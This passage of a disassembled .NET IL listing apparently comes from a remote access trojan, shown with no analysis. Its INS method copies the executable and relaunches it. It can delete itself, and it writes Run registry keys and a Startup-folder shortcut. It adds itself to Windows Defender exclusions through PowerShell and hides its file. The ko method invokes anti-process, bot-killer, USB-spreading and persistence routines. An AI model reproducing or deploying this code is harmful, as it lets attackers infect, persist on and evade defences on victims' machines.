      IL_03d2:  stloc.s    V_13
      IL_03d4:  ldloc.s    V_13
      IL_03d6:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_03db:  ldc.i4.s   32
      IL_03dd:  bne.un.s   IL_03ed

      IL_03df:  ldloc.1
      IL_03e0:  ldloc.s    V_13
      IL_03e2:  ldstr      ","
      IL_03e7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_03ec:  stloc.1
      IL_03ed:  ldloc.s    V_15
      IL_03ef:  ldc.i4.1
      IL_03f0:  add.ovf
      IL_03f1:  stloc.s    V_15
      IL_03f3:  ldloc.s    V_15
      IL_03f5:  ldloc.s    V_14
      IL_03f7:  ldlen
      IL_03f8:  conv.i4
      IL_03f9:  blt.s      IL_03cd

      IL_03fb:  leave.s    IL_0418

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03fd:  dup
      IL_03fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0403:  stloc.s    V_16
      IL_0405:  ldloc.s    V_16
      IL_0407:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_040c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0411:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0416:  leave.s    IL_0418

    }  // end handler
    IL_0418:  ldloc.0
    IL_0419:  ldloc.1
    IL_041a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_041f:  ret
  } // end of method OK::inf

  .method public static void  INS() cil managed noinlining nooptimization
  {
    // Code size       1211 (0x4bb)
    .maxstack  8
    .locals init (uint8[] V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             string V_5,
             string V_6,
             object V_7,
             class [mscorlib]System.Exception V_8)
    IL_0000:  ldc.i4     0x3e8
    IL_0005:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000a:  ldsfld     bool j.OK::Idr
    IL_000f:  brfalse    IL_016b

    IL_0014:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0019:  ldsfld     string j.OK::DR
    IL_001e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0023:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0028:  ldstr      "\\"
    IL_002d:  ldsfld     string j.OK::EXE
    IL_0032:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0037:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003c:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0041:  call       bool j.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                            class [mscorlib]System.IO.FileInfo)
    IL_0046:  brtrue     IL_016b

    .try
    {
      IL_004b:  ldsfld     string j.OK::DR
      IL_0050:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0055:  ldstr      "\\"
      IL_005a:  ldsfld     string j.OK::EXE
      IL_005f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0064:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0069:  brfalse.s  IL_0089

      IL_006b:  ldsfld     string j.OK::DR
      IL_0070:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0075:  ldstr      "\\"
      IL_007a:  ldsfld     string j.OK::EXE
      IL_007f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0084:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0089:  ldsfld     string j.OK::DR
      IL_008e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0093:  ldstr      "\\"
      IL_0098:  ldsfld     string j.OK::EXE
      IL_009d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a2:  ldc.i4.1
      IL_00a3:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_00a8:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00ad:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00b2:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_00b7:  stloc.0
      IL_00b8:  dup
      IL_00b9:  ldloc.0
      IL_00ba:  ldc.i4.0
      IL_00bb:  ldloc.0
      IL_00bc:  ldlen
      IL_00bd:  conv.i4
      IL_00be:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
      IL_00c3:  dup
      IL_00c4:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
      IL_00c9:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_00ce:  ldsfld     string j.OK::DR
      IL_00d3:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00d8:  ldstr      "\\"
      IL_00dd:  ldsfld     string j.OK::EXE
      IL_00e2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00e7:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_00ec:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00f1:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00f6:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00fb:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0100:  pop
      IL_0101:  ldsfld     bool j.OK::Melty
      IL_0106:  brfalse.s  IL_0146

      IL_0108:  newobj     instance void [System]System.Diagnostics.ProcessStartInfo::.ctor()
      IL_010d:  dup
      IL_010e:  ldstr      "/C choice /C Y /N /D Y /T 5 & Del \""
      IL_0113:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0118:  ldstr      "\""
      IL_011d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0122:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_Arguments(string)
      IL_0127:  dup
      IL_0128:  ldc.i4.1
      IL_0129:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_WindowStyle(valuetype [System]System.Diagnostics.ProcessWindowStyle)
      IL_012e:  dup
      IL_012f:  ldc.i4.1
      IL_0130:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_CreateNoWindow(bool)
      IL_0135:  dup
      IL_0136:  ldstr      "cmd.exe"
      IL_013b:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
      IL_0140:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(class [System]System.Diagnostics.ProcessStartInfo)
      IL_0145:  pop
      IL_0146:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_014b:  leave.s    IL_016b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_014d:  dup
      IL_014e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0153:  stloc.1
      IL_0154:  ldloc.1
      IL_0155:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_015a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_015f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0164:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0169:  leave.s    IL_016b

    }  // end handler
    IL_016b:  nop
    .try
    {
      IL_016c:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_0171:  ldstr      "1"
      IL_0176:  ldc.i4.1
      IL_0177:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_017c:  leave.s    IL_0197

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_017e:  dup
      IL_017f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0184:  stloc.2
      IL_0185:  ldloc.2
      IL_0186:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_018b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0190:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0195:  leave.s    IL_0197

    }  // end handler
    IL_0197:  ldsfld     bool j.OK::Isu
    IL_019c:  brfalse    IL_0254

    .try
    {
      IL_01a1:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01a6:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_01ab:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_01b0:  ldsfld     string j.OK::sf
      IL_01b5:  ldc.i4.1
      IL_01b6:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01bb:  ldsfld     string j.OK::RG
      IL_01c0:  ldstr      "\""
      IL_01c5:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01ca:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01cf:  ldstr      "\" .."
      IL_01d4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01d9:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_01de:  leave.s    IL_01f9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01e0:  dup
      IL_01e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01e6:  stloc.3
      IL_01e7:  ldloc.3
      IL_01e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f7:  leave.s    IL_01f9

    }  // end handler
    IL_01f9:  nop
    .try
    {
      IL_01fa:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01ff:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0204:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_0209:  ldsfld     string j.OK::sf
      IL_020e:  ldc.i4.1
      IL_020f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0214:  ldsfld     string j.OK::RG
      IL_0219:  ldstr      "\""
      IL_021e:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0223:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0228:  ldstr      "\" .."
      IL_022d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0232:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0237:  leave.s    IL_0254

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0239:  dup
      IL_023a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_023f:  stloc.s    V_4
      IL_0241:  ldloc.s    V_4
      IL_0243:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0248:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_024d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0252:  leave.s    IL_0254

    }  // end handler
    IL_0254:  ldsfld     bool j.OK::IsF
    IL_0259:  brfalse    IL_04ba

    .try
    {
      IL_025e:  ldc.i4.7
      IL_025f:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0264:  ldstr      "\\"
      IL_0269:  ldsfld     string j.OK::RG
      IL_026e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0273:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0278:  brfalse.s  IL_0294

      IL_027a:  ldc.i4.7
      IL_027b:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0280:  ldstr      "\\"
      IL_0285:  ldsfld     string j.OK::RG
      IL_028a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_028f:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0294:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0299:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_029e:  ldc.i4.7
      IL_029f:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02a4:  ldstr      "\\"
      IL_02a9:  ldsfld     string j.OK::RG
      IL_02ae:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02b3:  ldc.i4.1
      IL_02b4:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_02b9:  ldc.i4.7
      IL_02ba:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02bf:  ldstr      "\\"
      IL_02c4:  ldsfld     string j.OK::RG
      IL_02c9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02ce:  call       string [mscorlib]System.IO.Path::GetFileNameWithoutExtension(string)
      IL_02d3:  stloc.s    V_5
      IL_02d5:  ldc.i4.7
      IL_02d6:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02db:  ldstr      "\\"
      IL_02e0:  ldloc.s    V_5
      IL_02e2:  ldstr      ".url"
      IL_02e7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02ec:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_02f1:  brfalse.s  IL_030f

      IL_02f3:  ldc.i4.7
      IL_02f4:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02f9:  ldstr      "\\"
      IL_02fe:  ldloc.s    V_5
      IL_0300:  ldstr      ".url"
      IL_0305:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_030a:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_030f:  ldc.i4.7
      IL_0310:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0315:  ldstr      "\\"
      IL_031a:  ldsfld     string j.OK::RG
      IL_031f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0324:  stloc.s    V_6
      IL_0326:  ldc.i4.7
      IL_0327:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_032c:  ldstr      "\\"
      IL_0331:  ldloc.s    V_5
      IL_0333:  ldstr      ".url"
      IL_0338:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_033d:  newobj     instance void [mscorlib]System.IO.StreamWriter::.ctor(string)
      IL_0342:  stloc.s    V_7
      .try
      {
        IL_0344:  ldloc.s    V_6
        IL_0346:  ldc.i4.2
        IL_0347:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                          valuetype [mscorlib]System.IO.FileAttributes)
        IL_034c:  ldloc.s    V_7
        IL_034e:  ldnull
        IL_034f:  ldstr      "WriteLine"
        IL_0354:  ldc.i4.1
        IL_0355:  newarr     [mscorlib]System.Object
        IL_035a:  dup
        IL_035b:  ldc.i4.0
        IL_035c:  ldstr      "[InternetShortcut]"
        IL_0361:  stelem.ref
        IL_0362:  ldnull
        IL_0363:  ldnull
        IL_0364:  ldnull
        IL_0365:  ldc.i4.1
        IL_0366:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_036b:  pop
        IL_036c:  ldloc.s    V_7
        IL_036e:  ldnull
        IL_036f:  ldstr      "WriteLine"
        IL_0374:  ldc.i4.1
        IL_0375:  newarr     [mscorlib]System.Object
        IL_037a:  dup
        IL_037b:  ldc.i4.0
        IL_037c:  ldstr      "URL=file:///"
        IL_0381:  ldloc.s    V_6
        IL_0383:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0388:  stelem.ref
        IL_0389:  ldnull
        IL_038a:  ldnull
        IL_038b:  ldnull
        IL_038c:  ldc.i4.1
        IL_038d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_0392:  pop
        IL_0393:  ldloc.s    V_7
        IL_0395:  ldnull
        IL_0396:  ldstr      "WriteLine"
        IL_039b:  ldc.i4.1
        IL_039c:  newarr     [mscorlib]System.Object
        IL_03a1:  dup
        IL_03a2:  ldc.i4.0
        IL_03a3:  ldstr      "IconIndex=17"
        IL_03a8:  stelem.ref
        IL_03a9:  ldnull
        IL_03aa:  ldnull
        IL_03ab:  ldnull
        IL_03ac:  ldc.i4.1
        IL_03ad:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_03b2:  pop
        IL_03b3:  ldloc.s    V_7
        IL_03b5:  ldnull
        IL_03b6:  ldstr      "WriteLine"
        IL_03bb:  ldc.i4.1
        IL_03bc:  newarr     [mscorlib]System.Object
        IL_03c1:  dup
        IL_03c2:  ldc.i4.0
        IL_03c3:  ldstr      "IconFile=C:\\Windows\\system32\\SHELL32.dll"
        IL_03c8:  stelem.ref
        IL_03c9:  ldnull
        IL_03ca:  ldnull
        IL_03cb:  ldnull
        IL_03cc:  ldc.i4.1
        IL_03cd:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_03d2:  pop
        IL_03d3:  ldloc.s    V_7
        IL_03d5:  ldnull
        IL_03d6:  ldstr      "Flush"
        IL_03db:  ldc.i4.0
        IL_03dc:  newarr     [mscorlib]System.Object
        IL_03e1:  ldnull
        IL_03e2:  ldnull
        IL_03e3:  ldnull
        IL_03e4:  ldc.i4.1
        IL_03e5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_03ea:  pop
        IL_03eb:  leave.s    IL_03fe

      }  // end .try
      finally
      {
        IL_03ed:  ldloc.s    V_7
        IL_03ef:  brfalse.s  IL_03fd

        IL_03f1:  ldloc.s    V_7
        IL_03f3:  castclass  [mscorlib]System.IDisposable
        IL_03f8:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_03fd:  endfinally
      }  // end handler
      IL_03fe:  ldsfld     string j.OK::exlude
      IL_0403:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
      IL_0408:  brfalse.s  IL_0448

      IL_040a:  ldc.i4.1
      IL_040b:  newarr     [mscorlib]System.String
      IL_0410:  dup
      IL_0411:  ldc.i4.0
      IL_0412:  ldstr      "cmd /c powershell Add-MpPreference -ExclusionPath \""
      IL_0417:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_041c:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_0421:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0426:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_042b:  ldstr      "\" -Force"
      IL_0430:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0435:  stelem.ref
      IL_0436:  call       string [mscorlib]System.String::Concat(string[])
      IL_043b:  ldc.i4.0
      IL_043c:  ldc.i4.1
      IL_043d:  ldc.i4     0x1388
      IL_0442:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0447:  pop
      IL_0448:  ldsfld     bool j.OK::HIDE_ME
      IL_044d:  box        [mscorlib]System.Boolean
      IL_0452:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_0457:  brfalse.s  IL_049d

      IL_0459:  ldc.i4.3
      IL_045a:  newarr     [mscorlib]System.String
      IL_045f:  dup
      IL_0460:  ldc.i4.0
      IL_0461:  ldstr      "attrib +h \""
      IL_0466:  stelem.ref
      IL_0467:  dup
      IL_0468:  ldc.i4.1
      IL_0469:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_046e:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_0473:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0478:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_047d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0482:  stelem.ref
      IL_0483:  dup
      IL_0484:  ldc.i4.2
      IL_0485:  ldstr      "\""
      IL_048a:  stelem.ref
      IL_048b:  call       string [mscorlib]System.String::Concat(string[])
      IL_0490:  ldc.i4.0
      IL_0491:  ldc.i4.1
      IL_0492:  ldc.i4     0x1388
      IL_0497:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_049c:  pop
      IL_049d:  leave.s    IL_04ba

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_049f:  dup
      IL_04a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_04a5:  stloc.s    V_8
      IL_04a7:  ldloc.s    V_8
      IL_04a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_04ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_04b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_04b8:  leave.s    IL_04ba

    }  // end handler
    IL_04ba:  ret
  } // end of method OK::INS

  .method public static void  ko() cil managed noinlining nooptimization
  {
    // Code size       991 (0x3df)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             string V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10)
    IL_0000:  ldsfld     string j.OK::SLP
    IL_0005:  call       float64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToDouble(string)
    IL_000a:  ldc.r8     1000.
    IL_0013:  mul
    IL_0014:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0019:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_001e:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0023:  conv.ovf.i4
    IL_0024:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0029:  ldsfld     bool j.OK::Anti_CH
    IL_002e:  brfalse.s  IL_0043

    .try
    {
      IL_0030:  call       void MyAntiProcess::Start()
      IL_0035:  leave.s    IL_0043

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0037:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0041:  leave.s    IL_0043

    }  // end handler
    IL_0043:  ldsfld     bool j.OK::BOT_KILL
    IL_0048:  brfalse.s  IL_0064

    .try
    {
      IL_004a:  call       void BotKillers::RunStandardBotKiller()
      IL_004f:  ldc.i4.s   50
      IL_0051:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0056:  leave.s    IL_0064

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0058:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_005d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0062:  leave.s    IL_0064

    }  // end handler
    IL_0064:  ldsfld     bool j.OK::USB_SP
    IL_0069:  brfalse.s  IL_007e

    .try
    {
      IL_006b:  call       void spredusb::Start()
      IL_0070:  leave.s    IL_007e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0072:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0077:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_007c:  leave.s    IL_007e

    }  // end handler
    IL_007e:  ldsfld     bool j.OK::Persis
    IL_0083:  brfalse.s  IL_0098

    .try
    {
      IL_0085:  call       void Persistence::Startup()
      IL_008a:  leave.s    IL_0098

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_008c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0091:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0096:  leave.s    IL_0098

    }  // end handler
    IL_0098:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_009d:  brfalse.s  IL_00e2

    .try
    {
      IL_009f:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_00a4:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00a9:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_00ae:  ldstr      "di"
      IL_00b3:  ldstr      "!"
      IL_00b8:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_00bd:  leave.s    IL_00d8

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00bf:  dup
